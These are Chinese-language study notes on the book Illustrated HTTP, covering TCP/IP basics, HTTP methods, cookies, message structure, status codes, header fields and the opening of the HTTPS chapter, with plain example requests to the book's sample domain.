- [图解 HTTP 笔记](#图解-http-笔记)
  - [第一章 网络基础](#第一章-网络基础)
    - [1.1 网络基础 TCP/IP](#11-网络基础-tcpip)
    - [1.2 域名解析DNS服务](#12-域名解析dns服务)
    - [1.3 各个协议与 HTTP 协议关系](#13-各个协议与-http-协议关系)
  - [第二章 简单的 HTTP 协议](#第二章-简单的-http-协议)
    - [2.1 通过请求+响应的交换达到通信](#21-通过请求响应的交换达到通信)
    - [2.2 HTTP 是不保存状态的协议](#22-http-是不保存状态的协议)
    - [2.3 HTTP 请求方法](#23-http-请求方法)
    - [2.4 Cookie 的状态管理](#24-cookie-的状态管理)
  - [第三章 HTTP 报文信息](#第三章-http-报文信息)
    - [3.1 HTTP 报文](#31-http-报文)
    - [3.2 请求报文和响应报文](#32-请求报文和响应报文)
  - [第四章 HTTP 状态码](#第四章-http-状态码)
    - [4.1 状态码告知服务器返回的请求结果](#41-状态码告知服务器返回的请求结果)
    - [4.2 2XX 成功](#42-2xx-成功)
    - [4.3 3XX 重定向](#43-3xx-重定向)
    - [4.4 4XX 客户端错误](#44-4xx-客户端错误)
    - [4.5 5XX 服务器错误](#45-5xx-服务器错误)
  - [第五章 HTTP 首部](#第五章-http-首部)
    - [5.1 HTTP 报文首部](#51-http-报文首部)
    - [5.2 HTTP 首部字段](#52-http-首部字段)
    - [5.3 HTTP/1.1 通用首部字段](#53-http11-通用首部字段)
    - [5.4 请求首部字段](#54-请求首部字段)
    - [5.5 响应首部字段](#55-响应首部字段)
    - [5.6 实体首部字段](#56-实体首部字段)
    - [5.7 为 Cookie 服务的首部字段](#57-为-cookie-服务的首部字段)
  - [第六章 HTTPS 确保Web安全](#第六章-https-确保web安全)
    - [6.1 HTTP 的缺点](#61-http-的缺点)
    - [6.2 HTTP + 加密 + 认证 + 完整性保护 = HTTPS](#62-http--加密--认证--完整性保护--https)
  - [第七章 确认访问用户身份的认证](#第七章-确认访问用户身份的认证)
    - [7.1 BASIC 认证](#71-basic-认证)
    - [7.1 DIGEST 认证](#71-digest-认证)
    - [7.3 SSL 客户端认证](#73-ssl-客户端认证)
    - [7.4 基于表单认证](#74-基于表单认证)
  - [第八章 基于 HTTP 的功能追加协议](#第八章-基于-http-的功能追加协议)
    - [8.1 消除 HTTPS 瓶颈的 SPDY](#81-消除-https-瓶颈的-spdy)
    - [8.2 使用浏览器进行全双工通信的 WebSocket](#82-使用浏览器进行全双工通信的-websocket)
    - [8.3 期盼已久的 HTTP/2.0](#83-期盼已久的-http20)
    - [8.4 Web 服务器管理文件的 WebDAV](#84-web-服务器管理文件的-webdav)
  - [第九章 构建 Web 内容的技术](#第九章-构建-web-内容的技术)
    - [9.1 HTML](#91-html)
    - [9.2 动态 HTML](#92-动态-html)
    - [9.3 Web 应用](#93-web-应用)
    - [9.4 数据发布的格式及语言](#94-数据发布的格式及语言)
  - [第十章 Web 的攻击技术](#第十章-web-的攻击技术)
    - [10.1 针对 Web 的攻击技术](#101-针对-web-的攻击技术)
    - [10.2 因输出值转义不完全引发的安全漏洞](#102-因输出值转义不完全引发的安全漏洞)
    - [10.3 因设置或设计上的缺陷引发的安全漏洞 (大概率已过时)](#103-因设置或设计上的缺陷引发的安全漏洞-大概率已过时)
    - [10.4 因会话管理疏忽引发的安全漏洞](#104-因会话管理疏忽引发的安全漏洞)
    - [10.5 其他安全漏洞](#105-其他安全漏洞)

- **相关资源**
  - 书籍资源1: [Information_Security_Books/118http权威指南](https://github.com/olist213/Information_Security_Books/tree/main/118http%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97)
  - 书籍资源2: [Information_Security_Books/054图解HTTP彩色版](https://github.com/olist213/Information_Security_Books/tree/main/054%E5%9B%BE%E8%A7%A3HTTP%E5%BD%A9%E8%89%B2%E7%89%88)
  - 精简版1: [http: 自己提炼的关于《HTTP权威指南》每章的知识点总结](https://github.com/woai30231/http)
  - 精简版2: [《图解HTTP与HTTPS》的干货1.2w字【绝对保值】 - 掘金](https://juejin.cn/post/6900511779869327373#heading-16)
  - [HTTP 开发者指南 HTTP | MDN](https://developer.mozilla.org/zh-CN/docs/Web/HTTP)
- **拓展阅读**
  - [5分钟快速梳理你的HTTP体系-阿里云开发者社区](https://developer.aliyun.com/article/790991)

# 图解 HTTP 笔记

## 第一章 网络基础

> Web 使用的协议为 HTTP (HyperText Transfer Protocol, 超文本传输协议) 的协议作为规范, 完成从客户端到服务端等一系列运作流程，而协议是指规则的约定。也可以说Web是建立在HTTP协议上通信的。

### 1.1 网络基础 TCP/IP

**1.1.1 TCP/IP协议族**

TCP/IP协议族按照层次分别分为以下4层：应用层、传输层、网络层和数据链路层。

**应用层**: TCP/IP 协议族内预存了各类通用的**应用服务**处于应用层

**传输层**: 有两个性质不同的协议 TCP 和 UDP, 传输层对上层应用层提供处于网络连接中的两台计算机之间的数据传输

**网络层**: 网络层用于处理在网络上流动的数据包。数据包是网络传输的最小数据单位。该层规定了通过怎样的路径到达对方计算机，并把数据包传给对方。与对方计算机之间通过多台计算机或网络设备进行传输时，网络层所起的作用就是在众多的选项内选择一条传输路线。

**链路层**: 用来处理连接网络的硬件部分。包括控制操作系统、硬件的设备驱动、NIC【网络适配器俗称网卡】及光纤等物理可见部分。硬件上的范畴均在链路层的作用范围之内。

**1.1.2 TCP/IP通信传输流**

利用TCP/IP协议族进行网络通信时，会通过分层顺序与对方进行通信。发送端从应用层往下走，接收端从下层往上走。

在传输层【TCP协议】把从应用层处接收到的数据【HTTP请求报文】进行分割，并在各个报文上打上标记序号及端口号后转发给网络层。

### 1.2 域名解析DNS服务

DNS【Domain Nmae System】服务是和HTTP协议一样位于应用层协议。它提供域名到IP地址之间的解析服务。

### 1.3 各个协议与 HTTP 协议关系

通过下面一张图，看各个协议在HTTP协议通信中发挥的哪些作用？假设想浏览hackr.jp/xss/Web页面

![[Pasted image 20220920084454.png]]

## 第二章 简单的 HTTP 协议

> 本部分在主要讲述HTTP协议结构，主要使用的是HTTP/1.1

### 2.1 通过请求+响应的交换达到通信

看一个具体的例子
```http
GET /index.htm HTTP/1.1
Host: hacker.jp
```

起始的 Get 表示请求访问服务器的类型, 称为 **方法**. 随后的字符串 /index.html 指明了请求访问的 **资源对象**. 最后的 HTTP/1.1 代表 **HTTP的版本号**, 用来提示客户端使用的 HTTP 协议功能. 请求内容的意思是: 请求访问某台 HTTP 服务器上的 /index.htm 页面的资源

**请求报文** 是由请求方法, 请求URI, 协议版本, 可选的请求首部字段和内容实体构成的

![[Pasted image 20220920084700.png]]

响应报文基本由协议版本, 状态码和原因短语, 以及可选的响应首部字段和实体主体构成

![[Pasted image 20220920085005.png]]

### 2.2 HTTP 是不保存状态的协议

HTTP 是一种不保存状态的无状态协议, HTTP 协议自身不对请求和响应之间的通信状态进行保存.

- 客户端: 你之前给我发送了啥来着?
- 服务端: 我想想, 之前给你发送了啥来着?

### 2.3 HTTP 请求方法

**2.3.1 GET**

GET 方法用来请求访问已被 URI 识别的资源。指定的资源经过服务器端解析后返回响应内容。也就是说如果请求的资源是文本，那就保存原样返回，如果是CGI【通用网关接口】那样的程序，则返回经过执行后的输出结果。

```http
# 请求
GET/index.html HTTP/1.1
Host:www.hackr.jp
If-Modified-Since:Thu,12 Jul 2012 07:30:00 GMT

# 响应
仅返回2012年7月12日7点30分以后更新过的ndex.html页面资源.如果未 有内容更新,则以状态码304 Not Modified作
```

**2.3.2 POST**

POST 方法用来传输实体的主体

虽然 GET 也可以传输实体的主体, 但是一般不用, POST 的主要目的并不是获取相应的主题内容

```http
# 请求
POST /submit.cgi HTTP/1.1
Host:www.hackr.jp
Content-Length:1560 (1560字节的数据)

# 响应
返回submit.cgi接收数据的处理结果
```

**2.3.3 PUT**

PUT 方法的主要作用是上传文件, 要求在请求报文的主题中包含文件的内容, 然后保存到 URI 指定的位置

但是 HTTP/1.1 自身不带验证机制, 任何人都可以上传文件, 所以应该禁用 PUT 方法

```http
# 请求
PUT /example.html HTTP/1.1
Host:www.hackr.jp
Content-Type:text/html
Content-Length:1560 (1560字节的数据)

# 响应
响应返回状态码204 No Content (比如:该html已存在于服务器)
```

**2.3.4 HEAD**

获取报文首部

HEAD 方法和 GET 方法一样, 知识不返回报文主体部分, 用于确认 URI 的有效性及资源更新的日期时间等

- 客户端: 把那个的相关信息告诉我

```http
# 请求
HEAD /index.html HTTP/1.1
Host:www.hackr.jp

# 响应
返回index.html有关的响应首部
```

**2.3.5 DELETE**

DELETE 方法是用来删除文件的, 与之相反的是 PUT 方法, DELETE 方法按请求 URI 删除指定的资源, 同样的并没有验证机制, 也应该禁用

```http
# 请求
DELETE /example.html HTTP/1.1
Host:www.hackr.jp

# 响应
响应返回状态码204 No Content(比如:该html已从该服务器上乳除2
```

**2.3.6 OPTIONS**

OPTIONS 方法用来查询针对请求 URI 指定的资源支持方法

```http
# 请求
OPTIONS * HTTP/1.1
Host: www.hackr.jp

# 响应
HTTP/1.1 200 OK
Allow: GET.POST,HEAD,OPTIONS (返回服务器支持的方法)
```

**2.3.7 TRACE**

TRACE 方法是让 Web 服务器将之前的请求通信环回给客户端的方法

客户端通过 TRACE 方法可以查询发送出去的代理是怎样被加工修改的, 这是因为请求想要连接到源目标服务器可能会通过代理中专, TRACE 方法就是用来确认链接过程中发生的一系列操作

![[Pasted image 20220920090110.png]]

```http
# 请求
TRACE / HTTP/1.1
Host: hackr.jp
Max-Forwards: 2

# 响应
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 1024

TRACE / HTTP/1.1
Host: hackr.jp
Max-Forwards: 2(返回响应包含请求内容)
```
**2.3.8 CONNECT**

CONNECT要求用隧道协议链接代理

CONNECT 方法要求在与代理服务器通信时建立隧道, 实现用隧道协议进行 TCP 通信. 主要使用 SSL 和 TLS 协议把通信内容加密后经网络隧道传输.

CONNECT 方法格式: `CONNECT 代理服务器名:端口号 HTTP 版本`

```http
# 请求
CONNECT proxy.hackr.jp:8080 HTTP/1.1
Host: proxy.hackr.jp

# 响应
HTTP/1.1 200 OK (之后进入网络隧道)
```

### 2.4 Cookie 的状态管理

之前提到过 HTTP 是无状态协议, 它不对之前发生过的请求和响应状态进行管理, 无法根据之前的状态去处理这次的请求

为了解决这个问题, 引入了 Cookie 技术, Cookie 技术通过在请求和响应报文中写入 Cookie 信息来控制客户端的状态

Cookie 会根据服务端发送的响应报文中的一个叫 Set-Cookie 的首部字段, 通知客户端保存 Cookie, 当下次客户端再往服务器发送请求时, 客户端会自动在请求报文中加入 Cookie 值之后发出

- 第一次没有 Cookie 信息状态下请求
	1. 客户端发送请求
	2. 服务端在响应中添加 Cookie 后返回
- 第二次存有 Cookie 状态的请求
	1. 客户端在请求中添加 Cookie 后发送
	2. 服务端: 阿是刚才那个家伙; 发送响应

```http
# 请求报文 (没有Cookie信息)
GET /reader/HTTP/1.1
Host:hackr.jp
*首部字段内没有Cookie的相关信息

# 响应报文 (服务端生成Cookie信息)
HTTP/1.12000K
Date: Thu,12 Jul 2012 07:12:20 GMT
Server: Apache
<Set-Cookie: sid=1342077140226724;path=/;expires=Wed, 10-0ct-12 07:12:2 0GMT>
Content-Type:text/plain;charset=UTF-8

# 请求保存 (有Cookie信息)
GET /image/ HTTP/1.1
Host: hackr.jp
Cookie: sid=1342077140226724
```

## 第三章 HTTP 报文信息

### 3.1 HTTP 报文

用于 HTTP 协议交互的信息被称为 HTTP 报文. 客户端的 HTTP 报文叫做请求报文, 服务端的叫做响应报文

HTTP 报文大致可以分为**报文首部**和**报文主体**两块, 两者由最初出现的空行 (CR+LF) 来划分. 通常, 并不一定要有报文主体

- 报文首部: 服务端或客户端需处理的请求或响应内容及属性
- CR+LF: 
	- CR (Carriage Return, 回车符: 16 进制 0x0d )
	- LF (Line Frrd, 换行符: 16 进制 0x0a)
- 报文主体: 应被发送的数据

### 3.2 请求报文和响应报文

**3.2.1 请求报文**

![[Pasted image 20220920092107.png]]

- 请求行: 包含请求的方法, 请求 URI 和 HTTP 版本
- [x] 首部字段: 包含请求和响应的各种条件和属性的各类首部 (一般有四种首部, 分别是: 通用首部, 请求首部, 响应首部和实体首部)

**3.2.2 响应报文**

![[Pasted image 20220920092113.png]]

- 状态行: 包含响应结果和状态码, 原因短语和 HTTP 版本

## 第四章 HTTP 状态码

HTTP 状态码负责表示客户端 HTTP 请求的返回结果, 标记服务端的处理是否正常, 通信出现的错误等工作

### 4.1 状态码告知服务器返回的请求结果

状态码的职责是当客户端向服务器端发送请求时，描述返回的请求结果。借助状态码，用户可以知道服务器端是正常处理了请求，还是出现了错误。

**状态码的类别**

- 1XX : Informational(信息性状态码) : 接收的请求正在处理
- 2XX : Success(成功状态码) : 请求正常处理完毕
- 3XX : Redirection(重定向状态码) : 需要进行附加操作以完成请求
- 4XX : Client Error(客户端错误状态码) : 服务器无法处理请求
- 5XX : Server Error(服务器错误状态码) : 服务器处理请求出错

### 4.2 2XX 成功

2XX 的响应结果表明请求被正常处理了

**4.2.1 200 OK**

在响应报文内，随状态码一起返回的信息会因方法的不同而发生改变。比如，使用 GET 方法时，对应请求资源的实体会作为响应返回；而使用 HEAD 方法时，对应请求资源的实体首部不随报文主体作为响应返回（即在响应中只返回首部，不会返回实体的主体部分）。

**4.2.2 204 Not Content**

该状态码代表服务器接收的请求已成功处理，但在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回 204 响应，那么浏览器显示的页面不发生更新。

**4.2.3 206 Partial Content**

该状态码表示客户端进行了范围请求 (只请求一部分)，而服务器成功执行了这部分的GET 请求。响应报文中包含由 Content-Range 指定范围的实体内容。

### 4.3 3XX 重定向

3XX 响应结果表明浏览器需要执行某些特殊的处理以正确处理请求。

**4.3.1  301 Moved Permanently 永久性重定向**

请求的资源已被分配了新的 URI，以后应使用资源现在所指的 URI。也就是说，如果已经把资源对应的 URI 保存为书签了，这时应该按 Location 首部字段提示的 URI 重新保存。

**4.3.2 302 Found 临时重定向**

请求的资源已被分配了新的 URI，希望用户（本次）能使用新的 URI 访问。和 301 Moved Permanently 状态码相似，但 302 状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的URI 将来还有可能发生改变。比如，用户把 URI 保存成书签，但不会像 301 状态码出现时那样去更新书签，而是仍旧保留返回 302 状态码的页面对应的 URI。 

**4.3.3  303 See Other**

请求对应的资源存在着另一个 URI，应使用 GET方法定向获取请求的资源。

303 状态码和 302 Found 状态码有着相同的功能，但 303 状态码明确表示客户端应当采用 GET 方法获取资源，这点与 302 状态码有区别。 

**4.3.4 304 Not Modified**

客户端发送附带条件的请求时，服务器端允许请求访问资源，但未满足条件的情况。304 状态码返回时，不包含任何响应的主体部分。304 虽然被划分在 3XX 类别中，但是和重定向没有关系。

### 4.4 4XX 客户端错误

4XX 的响应结果表明客户端是发生错误的原因所在。

**4.4.1 400 Bad Request**

请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像 200 OK 一样对待该状态码。

**4.4.2 401 Unauthorized**

该发送的请求需要有通过 HTTP 认证（BASIC 认证、DIGEST 认证）的认证信息。另外若之前已进行过 1 次请求，则表示用 户认证失败。

**4.4.3 403 Forbidden**

对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但如果想作说明的话，可以在实体的主体部分对原因进行描述，这样就能让用户看到了。

**4.4.4 404 Not Found**

该状态码表明服务器上无法找到请求的资源。除此之外，也可以在服务器端拒绝请求且不想说明理由时使用。

### 4.5 5XX 服务器错误

5XX 的响应结果表明服务器本身发生错误。

**4.5.1 500 Internal Server Error**

该状态码表明服务器端在执行请求时发生了错误。也有可能是 Web应用存在的 bug 或某些临时的故障。

**4.5.2 503 Service Unavailable**

该状态码表明服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。如果事先得知解除以上状况需要的时间，最好写入RetryAfter 首部字段再返回给客户端。 

## 第五章 HTTP 首部

### 5.1 HTTP 报文首部

HTTP 协议的请求和响应报文中必定包含 HTTP 首部，首部内容为客户端和服务器分别处理请求和响应提供所需要的信息。

**HTTP 请求报文**

在请求中，HTTP 报文由方法、URI、HTTP 版本、HTTP 首部字段等部分构成。

- 报文首部: 
	- 请求行 (方法, URI, HTTP 版本)
	- 请求首部字段, 通用首部字段, 实体首部字段 (HTTP 首部字段)
	- 其他
- 空行 ( CR+LF)
- 报文主体

下面是访问 hacker.jp 时, 请求报文的首部信息

```http
GET / HTTP/1.1
Host: hackr.jp
User-Agent: Mozilla/5.0 (Windows NT 6.1;WOW64;rv:13.0)Ged
Accept: text/html,application/xhtml+xml,application/xml;q=0
Accept-Language: ja,en-us;q=0.7,en;q=0.3
Accept-Encoding: gzip,deflate
DNT: 1
Connection: keep-alive
If-Modified-Since: Fri,31 Aug 2007 02:02:20 GMT
If-None-Match: "45bae1-16a-46d776ac"
Cache-Control: max-age=0
```

**HTTP 响应报文**

在响应中，HTTP 报文由 HTTP 版本、状态码（数字和原因短语）、HTTP 首部字段 3 部分构成。 

- 报文首部: 
	- 状态行 (HTTP 版本, 状态码)
	- 响应首部字段, 通用首部字段, 实体首部字段 (HTTP 首部字段)
	- 其他
- 空行 ( CR+LF)
- 报文主体

下面是访问 hack.jp/ 时, 返回的响应报文的首部信息

```http
HTTP/1.1 304 Not Modified
Date: Thu,07 Jun 2012 07:21:36 GMT
Server: Apache
Connection: close
Etag: "45bae1-16a-46d776ac"
```
在报文众多的字段当中，HTTP 首部字段包含的信息最为丰富。首部字段同时存在于请求和响应报文内，并涵盖 HTTP 报文相关的内容信息。

### 5.2 HTTP 首部字段

**5.2.1 HTTP首部字段传递重要信息**

HTTP 首部字段是构成 HTTP 报文的要素之一。在客户端与服务器之间以 HTTP 协议进行通信的过程中，无论是请求还是响应都会使用首部字段，它能起到传递额外重要信息的作用。使用首部字段是为了给浏览器和服务器提供报文主体大小、所使用的语言、认证信息等内容。

**5.2.2 HTTP 首部字段结构**

HTTP 首部字段是由**首部字段名**和**字段值构成的**, 中间用冒号 ":" 分隔.

```text
首部字段名: 字段值
```
例如在 HTTP 首部中以 Content-Type 这个字段来表示报文主体的对象类型

```http
Content-Type: text/html
```

就上述示例来看, 首部字段名为 `Content-Type` 字符串 `text/html` 是字段值

**5.2.3 4种HTTP 首部字段类型**

HTTP 首部字段根据实际用途被分为以下 4 种类型。

-   通用首部字段（General Header Fields) : 请求报文和响应报文两方都会使用的首部。
-   请求首部字段（Request Header Fields）：从客户端向服务器端发送请求报文时使用的首部。补充了请求的附加内容、客户端信信息、响应内容相关优先级等信息。
-   响应首部字段（Response Header Fields）：从服务器端向客户端返回响应报文时使用的首部。补充了响应的附加内容，也会要求客户端附加额外的内容信息。 
-   实体首部字段（Entity Header Fields）：针对请求报文和响应报文的实体部分使用的首部。补充了资源内容更新时间等与实体有关的信息。 

**5.2.4 HTTP/1.1 首部字段**

**1. 通用首部字段**

- Cache-Control : 控制缓存的行为
- Connection : 逐跳首部、连接的管理
- Date : 创建报文的日期时间
- Pragma : 报文指令
- Trailer : 报文末端的首部一览
- Transfer-Encoding : 指定报文主体的传输编码方式
- Upgrade : 升级为其他协议
- Via : 代理服务器的相关信息
- Warning : 错误通知

**2. 请求首部字段**

- Accept : 用户代理可处理的媒体类型
- Accept-Charset : 优先的字符集
- Accept-Encoding : 优先的内容编码
- Accept-Language : 优先的语言（自然语言）
- Authorization : Web认证信息
- Expect : 期待服务器的特定行为
- From : 用户的电子邮箱地址
- Host : 请求资源所在服务器
- If-Match : 比较实体标记(ETag)
- If-Modified-Since : 比较资源的更新时间
- If-None-Match : 比较实体标记（与If-Match相反）
- If-Range : 资源未更新时发送实体Byte的范围请求
- If-Unmodified-Since : 比较资源的更新时间（与If-Modified-Since相反）
- Max-Forwards : 最大传输逐跳数
- Proxy-Authorization : 代理服务器要求客户端的认证信息
- Range : 实体的字节范围请求
- Referer : 对请求中URI的原始获取方
- TE : 传输编码的优先级
- User-Agent : HTTP客户端程序的信息

**3. 响应首部字段**

- Accept-Ranges : 是否接受字节范围请求
- Age : 推算资源创建经过时间
- ETag : 资源的匹配信息
- Location : 令客户端重定向至指定URI
- Proxy-Authenticate : 代理服务器对客户端的认证信息
- Retry-After : 对再次发起请求的时机要求
- Server : HTTP服务器的安装信息
- Vary : 代理服务器缓存的管理信息
- WWW-Authenticate : 服务器对客户端的认证信息

**4. 实体首部字段**

- Allow : 资源可支持的HTTP方法
- Content-Encoding : 实体主体适用的编码方式
- Content-Language : 实体主体的自然语言
- Content-Length : 实体主体的大小（单位:字节）
- Content-Location : 替代对应资源的URI
- Content-MD5 : 实体主体的报文摘要
- Content-Range : 实体主体的位置范围
- Content-Type : 实体主体的媒体类型
- Expires : 实体主体过期的日期时间
- Last-Modified : 资源的最后修改日期时间

### 5.3 HTTP/1.1 通用首部字段

通用首部字段是指, 请求报文和响应报文双方都会使用的首部

**5.3.1 Cache-Control**

![[Pasted image 20220920101039.png]]

**Cache-Control** 通用消息头字段，被用于在 http 请求和响应中，通过指定指令来实现缓存机制。缓存指令是单向的，这意味着在请求中设置的指令，不一定被包含在响应中。

通用指定首部字段 Cache-Control 的指令, 就能操作缓存的工作机制

指令的参数是可选的，多个指令之间通过“,”分隔。首部字段 Cache-Control 的指令可用于请求及响应时。  

```http
Cache-Control: private, max-age=0, no-cache 
```

**public 指令**

```http
Cache-Control: Public
```

当指定使用 public 指令时, 则明确表明其他用户也可以利用缓存

**private 指令**

```http
Cache-Control: private
```

当指定 private 指令后, 响应只以特定的用户作为对象, 这与 public 指定的行为相反, 缓存服务器会对该特定用户提供资源缓存的服务, 对于其他用户发送的请求, 代理服务器则不会返回缓存

**no-cache 指令**

```http
Cache-Control: no-cache
```

使用 no-chache 指令的目的是防止从缓存中返回过期的资源, 客户端发送的请求中如果包含 no-cache 指令, 则表示客户单将不会接受缓存过的响应, 于是 "中间" 的缓存服务器必须把客户端请求转发给资源服务器

**no-store 指令**

```http
Cache-Control: no-store
```

当使用 no-store 指令 1 时，暗示请求（和对应的响应）或响应中包含机密信息。

**指定缓存期限和认证的指令**

**s-maxage 指令**

```http
Cache-Control: s-maxage=604800（单位 ：秒)
```

s-maxage 指令的功能和 max-age 指令的相同，它们的不同点是 s-maxage 指令只适用于供多位用户使用的公共缓存服务器 2。也就是说，对于向同一用户重复返回响应的服务器来说，这个指令没有任何作用。

**max-age 指令**

```http
Cache-Control: max-age=604800（单位：秒）
```

当客户端发送的请求中包含 max-age 指令时，如果判定缓存资源的缓存时间数值比指定时间的数值更小，那么客户端就接收缓存的资源。

另外，当指定 max-age 值为 0，那么缓存服务器通常需要将请求转发给源服务器。当服务器返回的响应中包含 max-age 指令时，缓存服务器将不对资源的

**min-fresh 指令**

```http
Cache-Control: min-fresh=60（单位：秒） 
```

min-fresh 指令要求缓存服务器返回至少还未过指定时间的缓存资源。比如，当指定 min-fresh 为 60 秒后，过了 60 秒的资源都无法作为响应返回了。 

**only-if-cached 指令**

```http
Cache-Control: only-if-cached
```

使用 only-if-cached 指令表示客户端仅在缓存服务器本地缓存目标资源的情况下才会要求其返回。换言之，该指令要求缓存服务器不重新加载响应，也不会再次确认资源有效性。若发生请求缓存服务器的本地缓存无响应，则返回状态码 504 Gateway Timeout。 

**5.3.2 Connection**

Connection 首部字段具备如下两个作用。

1. 控制不再转发给代理的首部字段

```http
# 原始请求
GET HTTP/1.1
Upgrade:HTTP/1.1
Connection:Upgrade

# 不转发首部字段
GET / HTTP/1.1
```

在客户端发送请求和服务器返回响应内，使用 Connection 首部字段，可控制不再转发给代理的首部字段（即 Hop-by-hop 首部）。 

2. 管理持久连接

```http
Connection: Keep-Alive

# 请求数据
GET / HTTP/1.1
Connection: Keep-Alive

# 响应数据
HTTP/1.1 200 OK
...
Keep-Alive:timeout=10,max=500
Connection:Keep-Alive
```

**5.3.3 Via**

使用首部字段 Via 是为了追踪客户端与服务器之间的请求和响应报文的传输路径, 首部字段 Via 不仅用于追踪报文的转发, 还可以避免请求

回环的发生。所以必须在经过代理时附加该首部字段内容。 

![[Pasted image 20220920101755.png]]

### 5.4 请求首部字段

请求首部字段是从客户端往服务器端发送请求报文中所使用的字段，用于补充请求的附加信息、客户端信息、对响应内容相关的优先级等内容。

**5.4.1 Accept**

![[Pasted image 20220920101857.png]]

Accept 首部字段可通知服务器，用户代理能够处理的媒体类型及媒体类型的相对优先级。可使用 type/subtype 这种形式，一次指定多种媒体类型。 

**5.4.2 Accept-Charset**

![[Pasted image 20220920101933.png]]

Accept-Charset 首部字段可用来通知服务器用户代理支持的字符集及字符集的相对优先顺序。另外，可一次性指定多种字符集。与首部字段 Accept 相同的是可用权重 q 值来表示相对优先级。 

**5.4.3 Accept-Encoding**

![[Pasted image 20220920101959.png]]

Accept-Encoding 首部字段用来告知服务器用户代理支持的内容编码及 内容编码的优先级顺序。可一次性指定多种内容编码。

### 5.5 响应首部字段

响应首部字段是由服务器端向客户端返回响应报文中所使用的字段，用于补充响应的附加信息、服务器信息，以及对客户端的附加要求等信息

**5.5.1 Accept-Ranges**

```http
Accept-Ranges: bytes
```

首部字段 Accept-Ranges 是用来告知客户端服务器是否能处理范围请求，以指定获取服务器端某个部分的资源。 可指定的字段值有两种，可处理范围请求时指定其为 bytes，反之则指定其为 none。 

**5.5.2 Age**

```http
Age: 600
```

首部字段 Age 能告知客户端，源服务器在多久前创建了响应。字段值的单位为秒。若创建该响应的服务器是缓存服务器，Age 值是指缓存后的响应再次发起认证到认证完成的时间值。代理创建响应时必须加上首部字段Age

**5.5.3 Location**

![[Pasted image 20220920102155.png]]

使用首部字段 Location 可以将响应接收方引导至某个与请求 URI 位置不同的资源。几乎所有的浏览器在接收到包含首部字段 Location 的响应后，都会强制性地尝试对已提示的重定向资源的访问。

### 5.6 实体首部字段

实体首部字段是包含在请求报文和响应报文中的实体部分所使用的首部，用于补充内容的更新时间等与实体相关的信息。

**5.6.1 Allow**

```http
Allow: GET, HEAD
```

首部字段 Allow 用于通知客户端能够支持 Request-URI 指定资源的所有 HTTP 方法。当服务器接收到不支持的 HTTP 方法时，会以状态码405 Method Not Allowed 作为响应返回。与此同时，还会把所有能支持的 HTTP 方法写入首部字段 Allow 后返回。 

**5.6.2 Content-Type**

```http
Content-Type: text/html; charset=UTF-8 
```

首部字段 Content-Type 说明了实体主体内对象的媒体类型。和首部字段 Accept 一样，字段值用 type/subtype 形式赋值。 

**5.6.3 Expires**

```http
Expires: Wed, 04 Jul 2020 08:26:05 GMT
```

首部字段 Expires 会将资源失效的日期告知客户端。缓存服务器在接收到含有首部字段 Expires 的响应后，会以缓存来应答请求，在Expires 字段值指定的时间之前，响应的副本会一直被保存。当超过指定的时间后，缓存服务器在请求发送过来时，会转向源服务器请求资源。 

源服务器不希望缓存服务器对资源缓存时，最好在 Expires 字段内写入与首部字段 Date 相同的时间值。

**5.6.4 Last-Modified**

```http
Last-Modified: Wed, 23 May 2020 09:59:55 GMT
```

首部字段 Last-Modified 指明资源最终修改的时间。一般来说，这个值就是 Request-URI 指定资源被修改的时间。但类似使用 CGI 脚本进

行动态数据处理时，该值有可能会变成数据最终修改时的时间。

### 5.7 为 Cookie 服务的首部字段

**5.7.1 Set-Cookie**

```http
Set-Cookie: status=enable; expires=Tue, 05 Jul 2020 07:26:31
```

当服务器准备开始管理客户端的状态时，会事先告知各种信息。 

Set-Cookie字段值

- NAME-VALUE : 赋予Cookie的名称和其值（必需项）
- expires=DATE : Cookie的有效期（若不明确指定则默认为浏览器关闭前为止）
- path=PATH : 将服务器上的文件目录作为Cookie的适用对象（若不指定则默 认为文档所在的文件目录)
- domain=域名 : 作为Cookie适用对象的域名（若不指定则默认为创建Cookie 的服务器的域名)
- Secure : 仅在HTTPS安全通信时才会发送Cookie
- HttpOnly : 加以限制，使Cookie不能被JavaScript脚本访问

**5.7.2 Cookie**

```http
Cookie: status=enable
```

首部字段 Cookie 会告知服务器，当客户端想获得 HTTP 状态管理支持时，就会在请求中包含从服务器接收到的 Cookie。接收到多个Cookie 时，同样可以以多个 Cookie 形式发送。 

## 第六章 HTTPS 确保Web安全

### 6.1 HTTP 的缺点

- 无法证明报文的完整性, 内容可能被篡改
- 通信使用明文 (不加密), 内容可能被监听
- 不验证通信双方的身份, 可能遭遇伪装

### 6.2 HTTP + 加密 + 认证 + 完整性保护 = HTTPS

通常在登录页面或是购物页面使用 HTTPS 通信, 使用 HTTPS 通信时, 不再使用 http:// 协议 而是使用 https://

当浏览器访问 HTTPS 通信有效的 Web 页面时, 浏览器的地址栏内会出现一个带锁的标记, 对 HTTPS 的显示方式会因为浏览器的不同而有所改变

**6.2.1 HTTPS是自身披SSL外壳的HTTP**

HTTPS 并非是应用层的一种新协议. 只是 HTTP **通信接口部分用SSL**（Secure Socket Layer）和 **TLS**（Transport Layer Security）协议代替而已。当使用 SSL时，则演变成先和 SSL通信，再由 SSL和 TCP 通信了。简言之，所谓 HTTPS，其实就是身披SSL协议这层外壳的 HTTP。 

在采用 SSL 后, HTTP 就拥有了 HTTPS 的加密, 证书和完整性保护这些功能

SSL 是独立于 HTTP 的协议, 所以不光是 HTTP 协议, 其他运行在应用层的如 SMTP 和 Telnet 等协议均可配合 SSL 协议使用. 可以说 SSL 是当今世界上应用最为广泛的网络安全技术

**6.2.2 相互交换密钥的公开加密技术**

SSL 采用一种叫公开密钥加密 (Public-key cryptography) 的加密处理方式

加密和解密都会用到密钥, 如果没有密钥则无法对密码解密. 同样, 任何人只要持有密钥就能解密. 如果密钥被攻击者获得, 那加密也就失去了意义

**1. 共享密钥加密的困境**

加密和解密使用同一个密钥的方式叫共享密钥加密 (Common key crypto system), 也被叫做**对称密钥加密**

